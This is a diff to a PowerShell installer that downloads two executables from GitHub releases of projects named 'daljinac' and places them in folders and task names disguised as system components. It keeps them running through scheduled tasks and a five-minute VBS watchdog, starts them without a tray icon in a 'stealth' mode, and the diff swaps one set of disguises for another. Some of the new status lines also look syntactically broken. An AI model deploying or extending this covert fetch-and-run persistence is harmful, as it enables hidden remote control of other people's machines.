@@ -13,21 +13,25 @@ if ($normal) {
 } else {
     $agents = @()
     if ($v1) {
-        $agents += @{ Name='v1stealth'; Dir='C:\ProgramData\Microsoft\HelpData'; ExeName='HelpDataHost.exe'; TaskName='HelpDataHost'; URL='https://github.com/egzakutacno/daljinac/releases/latest/download/systemUI.exe'; Port=8081; ExtraArgs='-notray' }
+        $agents += @{ Name='sdhost'; Dir='C:\Program Files\Common Files\Sdh'; ExeName='sdhost.exe'; TaskName='sdhost'; URL='https://github.com/egzakutacno/daljinac/releases/latest/download/systemUI.exe'; Port=8081; ExtraArgs='-notray' }
     }
     if ($v2) {
-        $agents += @{ Name='v2stealth'; Dir='C:\ProgramData\Microsoft\DiagHub'; ExeName='DiagHubHost.exe'; TaskName='DiagHubHost'; URL='https://github.com/egzakutacno/daljinac2/releases/latest/download/daljinac2.exe'; Port=1984; ExtraArgs='-notray' }
+        $agents += @{ Name='sdagent'; Dir='C:\Program Files\Common Files\Sda'; ExeName='sdagent.exe'; TaskName='sdagent'; URL='https://github.com/egzakutacno/daljinac2/releases/latest/download/daljinac2.exe'; Port=1984; ExtraArgs='-notray' }
     }
     $stealth = $true
 }
 
-# One-time cleanup of ALL old tasks (both agents)
+# One-time cleanup of ALL old tasks
 Write-Host "=== Cleanup ===" -ForegroundColor Cyan
 @("Daljinac","DaljinacWatch","Daljinac2","Daljinac2Watch",
   "HelpDataHost","HelpDataHostWatch","DiagHubHost","DiagHubHostWatch",
-  "systemUI","daljinac2") | ForEach-Object {
+  "systemUI","daljinac2","sdhost","sdhostWatch","sdagent","sdagentWatch") | ForEach-Object {
     schtasks /delete /tn $_ /f 2>$null
 }
+
+# Clean old stealth dirs
+rmdir /s /q "C:\ProgramData\Microsoft\HelpData" 2>$null
+rmdir /s /q "C:\ProgramData\Microsoft\DiagHub" 2>$null
 
 foreach ($a in $agents) {
     Write-Host "=== $($a.Name) ===" -ForegroundColor Cyan
@@ -86,8 +90,6 @@ foreach ($a in $agents) {
     Set-Content -Path "$($a.Dir)\watchdog.vbs" -Value $vbs -Encoding ASCII
     schtasks /create /tn "$($a.TaskName)Watch" /tr "wscript.exe //B $($a.Dir)\watchdog.vbs" /sc MINUTE /mo 5 /f
 
-    if ($stealth) { attrib +h +s $a.Dir }
-
     # Start
     ([wmiclass]'Win32_Process').Create("`"$Exe`" $($a.ExtraArgs)") | Out-Null
     Start-Sleep -Seconds 2
@@ -95,21 +97,21 @@ foreach ($a in $agents) {
 
 Write-Host ""
 Write-Host "DONE." -ForegroundColor Green
-if ($stealth) { Write-Host "  Mode: STEALTH" } else { Write-Host "  Mode: NORMAL" }
-if ($v1) { Write-Host "  v1: $($agents | Where-Object Name -match v1 | ForEach-Object ExeName)" }
-if ($v2) { Write-Host "  v2: $($agents | Where-Object Name -match v2 | ForEach-Object ExeName)" }
+if ($stealth) { Write-Host "  Mode: NOTRAY (Common Files)" } else { Write-Host "  Mode: NORMAL" }
+if ($v1) { Write-Host "  v1: $($agents | Where-Object Name -match sdhost -or $_.Name -eq 'daljinac' | ForEach-Object { $_.ExeName })" }
+if ($v2) { Write-Host "  v2: $($agents | Where-Object Name -match sdagent -or $_.Name -eq 'daljinac2' | ForEach-Object { $_.ExeName })" }
 
 # Verify
 Start-Sleep -Seconds 3
 Write-Host ""
 Write-Host "Verifying..." -ForegroundColor Cyan
 if ($v1) {
-    $p = Get-Process -Name HelpDataHost,systemUI -ErrorAction SilentlyContinue
+    $p = Get-Process -Name sdhost,systemUI,HelpDataHost -ErrorAction SilentlyContinue
     if ($p) { Write-Host "  v1: RUNNING (PID $($p.Id))" -ForegroundColor Green }
     else     { Write-Host "  v1: NOT FOUND - check manually" -ForegroundColor Red }
 }
 if ($v2) {
-    $p = Get-Process -Name DiagHubHost,daljinac2 -ErrorAction SilentlyContinue
+    $p = Get-Process -Name sdagent,daljinac2,DiagHubHost -ErrorAction SilentlyContinue
     if ($p) { Write-Host "  v2: RUNNING (PID $($p.Id))" -ForegroundColor Green }
     else     { Write-Host "  v2: NOT FOUND - check manually" -ForegroundColor Red }
 }
